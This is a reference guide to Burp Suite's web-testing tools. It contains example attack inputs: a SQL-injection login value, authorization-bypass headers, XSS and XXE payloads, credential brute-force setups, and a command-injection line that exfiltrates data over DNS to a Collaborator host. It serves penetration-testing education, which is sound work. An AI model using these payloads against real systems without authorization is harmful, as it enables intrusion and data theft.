# Burp Suite Features

> Detailed documentation of Burp Suite's core features and tools for web application penetration testing.

## Table of Contents

- [Proxy](#proxy)
- [Repeater](#repeater)
- [Intruder](#intruder)
- [Scanner](#scanner)
- [Comparer](#comparer)
- [Decoder](#decoder)
- [Sequencer](#sequencer)
- [Collaborator](#collaborator)

---

## Proxy

The Burp Proxy is the core of Burp Suite, operating as a man-in-the-middle between your browser and target applications.

### Proxy Configuration

#### Listener Setup

```
Proxy > Options > Proxy Listeners

Default: 127.0.0.1:8080

Add listener:
- Bind to port: 8080
- Bind to address: Loopback only (127.0.0.1)
- For remote: All interfaces or specific IP
```

#### Invisible Proxying

For non-proxy-aware clients:

```
1. Edit listener > Request handling
2. Enable "Support invisible proxying"
3. Configure hosts file or DNS to redirect traffic
```

### Intercept Settings

#### Request Interception Rules

```
Proxy > Options > Intercept Client Requests

Default rules:
- AND: File extension does NOT match: css|js|gif|jpg|png|...
- AND: Request is in-scope

Custom rule examples:
- Match URL: Contains "admin"
- Match body: Contains "password"
- Match headers: Authorization header present
```

#### Response Interception

```
Proxy > Options > Intercept Server Responses

Enable: "Intercept responses based on the following rules"

Useful rules:
- OR: Content-Type header contains "html"
- OR: Response was modified
```

### Match and Replace

Automatically modify requests/responses:

```
Proxy > Options > Match and Replace

Examples:
| Type | Match | Replace | Purpose |
|------|-------|---------|---------|
| Request header | User-Agent:.* | User-Agent: CustomBot | Spoof UA |
| Request body | password= | password=test& | Inject payload |
| Response body | </head> | <script>alert(1)</script></head> | XSS testing |
| Response header | X-Frame-Options.* | (empty) | Remove security headers |
```

### HTTP History

View all proxied traffic:

```
Proxy > HTTP history

Features:
- Filter by: MIME type, status code, search term
- Highlight: Color-code interesting requests
- Annotations: Add comments to requests
- Send to: Right-click to send to other tools
```

### WebSocket Support

```
Proxy > WebSockets history

- View WebSocket messages
- Intercept and modify frames
- Send to Repeater for testing
```

---

## Repeater

Repeater allows manual manipulation and resending of individual HTTP requests.

### Basic Usage

```
1. Capture request in Proxy
2. Right-click > Send to Repeater (Ctrl+R)
3. Modify request as needed
4. Click "Send"
5. Analyze response
```

### Request Manipulation

#### Modifying Parameters

```http
# Original
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=user&password=pass

# Modified for testing
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

#### Header Manipulation

```http
# Test authorization bypass
GET /admin/users HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin/users
X-Custom-IP-Authorization: 127.0.0.1
```

### Response Analysis

| Feature | Usage |
|---------|-------|
| Render | View HTML response as rendered page |
| Pretty | Format JSON/XML responses |
| Raw | View exact response bytes |
| Hex | Binary/hex view of response |

### Tab Management

```
- Rename tabs: Double-click tab name
- Duplicate: Right-click > Duplicate tab
- Group: Organize related requests in groups
- Compare: Send multiple to Comparer
```

### Follow Redirects

```
Settings cog > Follow redirections: Never/On-site/In-scope/Always

Redirect options:
- Process cookies: Update cookie jar from Set-Cookie headers
- Auto-select redirect: Follow and select redirect tab
```

---

## Intruder

Intruder performs automated customized attacks against web applications.

### Attack Types

#### 1. Sniper

Single payload set, one position at a time.

```
Positions: username=§user§&password=§pass§
Payload set 1: [admin, root, test]

Requests generated:
1. username=admin&password=§pass§
2. username=root&password=§pass§
3. username=test&password=§pass§
4. username=§user§&password=admin
5. username=§user§&password=root
6. username=§user§&password=test

Total: positions × payloads = 2 × 3 = 6 requests
Use case: Testing each parameter individually for vulnerabilities
```

#### 2. Battering Ram

Single payload set, same payload in all positions simultaneously.

```
Positions: username=§user§&password=§pass§
Payload set 1: [admin, root, test]

Requests generated:
1. username=admin&password=admin
2. username=root&password=root
3. username=test&password=test

Total: payloads = 3 requests
Use case: Testing same value across multiple fields
```

#### 3. Pitchfork

Multiple payload sets, synchronized iteration.

```
Positions: username=§user§&password=§pass§
Payload set 1: [admin, user, guest]
Payload set 2: [admin123, user123, guest123]

Requests generated:
1. username=admin&password=admin123
2. username=user&password=user123
3. username=guest&password=guest123

Total: min(set1, set2) = 3 requests
Use case: Known username:password pairs, credential stuffing
```

#### 4. Cluster Bomb

Multiple payload sets, all combinations.

```
Positions: username=§user§&password=§pass§
Payload set 1: [admin, root]
Payload set 2: [password, 123456, admin]

Requests generated:
1. username=admin&password=password
2. username=admin&password=123456
3. username=admin&password=admin
4. username=root&password=password
5. username=root&password=123456
6. username=root&password=admin

Total: set1 × set2 = 2 × 3 = 6 requests
Use case: Brute-force all combinations
```

### Position Markers

```
# Auto-detect
Click "Auto §" to automatically mark parameters

# Manual marking
Select text and click "Add §"
username=§value_here§

# Clear all
Click "Clear §"
```

### Payload Types

| Type | Description | Example |
|------|-------------|---------|
| Simple list | Custom wordlist | admin, root, test |
| Runtime file | Load from file | /usr/share/wordlists/rockyou.txt |
| Numbers | Sequential/random numbers | 1-1000, step 1 |
| Dates | Date formats | 2020-01-01 to 2024-12-31 |
| Brute forcer | Character set combinations | a-z, 4 chars = aaaa-zzzz |
| Null payloads | Empty/repeated requests | Rate limit testing |
| Username generator | Common username formats | john.doe, jdoe, j.doe |

### Payload Processing

```
Payload Processing Rules (applied in order):

1. Add prefix: admin_
2. Add suffix: _test
3. Encode: URL-encode
4. Hash: MD5/SHA1
5. Match/Replace: regex substitution

Example: payload "user" becomes "admin_user_test" URL-encoded
```

### Grep - Match/Extract

```
Grep - Match:
- Match: "Invalid password"  # Flag failed logins
- Match: "Welcome"           # Flag successful logins

Grep - Extract:
- Regex: "token=([a-f0-9]+)"  # Extract tokens from responses
- Start: "CSRF: " End: "</span>"  # Extract between markers
```

### Resource Pool (Pro)

```
Intruder > Resource pool

Throttling options:
- Maximum concurrent requests: 10
- Delay between requests: 100ms
- Random delay: 50-200ms
- Throttle on errors
```

---

## Scanner

Automated vulnerability scanning (Professional/Enterprise only).

### Scan Types

#### Active Scan

```
1. Right-click request > Scan
2. Or: Dashboard > New scan > Crawl and audit

Active checks include:
- SQL injection
- XSS (reflected, stored)
- Command injection
- Path traversal
- SSRF
- XXE
- And many more...
```

#### Passive Scan

```
Automatically analyzes all proxied traffic for:
- Information disclosure
- Missing security headers
- Insecure cookies
- Sensitive data in URLs
- Mixed content issues
```

### Scan Configuration

```
Dashboard > New scan > Scan configuration

Audit options:
- Insertion point types: Parameters, headers, cookies
- Detection methods: In-band, out-of-band, time-based
- Handling: Follow redirects, maintain session

Speed vs. thoroughness presets:
- Lightweight: Fast, basic checks
- Normal: Balanced
- Deep: Thorough, slower
```

### Scan Scope

```
Target > Scope > Use advanced scope control

Include:
- Protocol: HTTPS
- Host: *.target.com
- Port: 443
- File: ^/api/.*

Exclude:
- File: logout|signout
- File: \.pdf$
```

### Issue Reporting

```
Issue severity levels:
- High: Critical vulnerabilities (SQLi, RCE)
- Medium: Significant issues (XSS, CSRF)
- Low: Minor issues (information disclosure)
- Information: Non-security findings

Export: Right-click > Report issues > HTML/XML
```

---

## Comparer

Compare two items (requests or responses) side by side.

### Usage

```
1. Select item in Proxy/Repeater
2. Right-click > Send to Comparer
3. Repeat for second item
4. Go to Comparer tab
5. Select items and click "Words" or "Bytes"
```

### Comparison Modes

| Mode | Use Case |
|------|----------|
| Words | Compare text content, ignoring whitespace differences |
| Bytes | Exact byte-by-byte comparison |

### Practical Applications

```
1. Session token analysis:
   - Compare responses before/after login
   - Identify session-specific content

2. Access control testing:
   - Compare admin vs. regular user responses
   - Find authorization bypass opportunities

3. Parameter impact:
   - Compare responses with different parameter values
   - Identify logic differences
```

---

## Decoder

Encode, decode, and hash data in various formats.

### Supported Transformations

| Category | Formats |
|----------|---------|
| Encoding | URL, HTML, Base64, Hex, ASCII hex, Octal, Binary, Gzip |
| Hashing | MD5, SHA-1, SHA-256, SHA-384, SHA-512 |

### Usage Examples

#### Decode Chain

```
Input: %3Cscript%3Ealert%281%29%3C%2Fscript%3E
Decode as: URL
Output: <script>alert(1)</script>
```

#### Encode for XSS

```
Input: <script>alert(1)</script>
Encode as: HTML
Output: &lt;script&gt;alert(1)&lt;/script&gt;
```

#### Smart Decode

```
Click "Smart decode" to auto-detect and decode:
- Nested encodings (base64 inside URL encoding)
- Multiple layers of obfuscation
```

### Hex Editor Mode

```
Switch to "Hex" tab for:
- Binary data manipulation
- Null byte injection
- Non-printable character handling
```

---

## Sequencer

Analyze the quality of randomness in tokens and session identifiers.

### Token Capture

#### Live Capture

```
1. Sequencer > Live capture
2. Select request that generates tokens
3. Define token location:
   - Cookie value
   - Form field
   - Custom location (regex)
4. Start capture (need 100+ samples)
```

#### Manual Load

```
1. Sequencer > Manual load
2. Paste collected tokens (one per line)
3. Analyze
```

### Analysis Results

| Test | Description |
|------|-------------|
| Overall result | Excellent/Good/Fair/Poor randomness |
| Effective entropy | Bits of unpredictability |
| Character-level analysis | Distribution of each position |
| Bit-level analysis | Randomness of individual bits |

### Interpretation

```
Entropy assessment:
- >128 bits: Cryptographically secure
- 64-128 bits: Generally adequate
- <64 bits: Potentially predictable

Red flags:
- Sequential patterns
- Timestamp-based tokens
- Predictable character positions
```

---

## Collaborator

Out-of-band application security testing (Professional only).

### Overview

Burp Collaborator is an external server that detects blind vulnerabilities by receiving callbacks when payloads execute.

### Capabilities

| Protocol | Detection |
|----------|-----------|
| HTTP/HTTPS | Blind SSRF, XXE, header injection |
| DNS | Any external interaction, exfiltration |
| SMTP | Email header injection |

### Usage

#### Generate Payload

```
Burp menu > Burp Collaborator client
Click "Copy to clipboard"

Payload format: xyz123.burpcollaborator.net
```

#### Insert Payload

```http
# Blind SSRF
POST /webhook HTTP/1.1
Content-Type: application/json

{"url": "http://xyz123.burpcollaborator.net"}

# XXE
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xyz123.burpcollaborator.net">
]>
<foo>&xxe;</foo>

# DNS exfiltration
; nslookup $(whoami).xyz123.burpcollaborator.net
```

#### Check for Interactions

```
Collaborator client > Poll now

Shows:
- Timestamp
- Client IP
- Protocol used
- Full request/response details
```

### Private Collaborator Server

```
For sensitive engagements:
- Deploy private Collaborator server
- Project options > Misc > Burp Collaborator server
- Configure custom domain
```
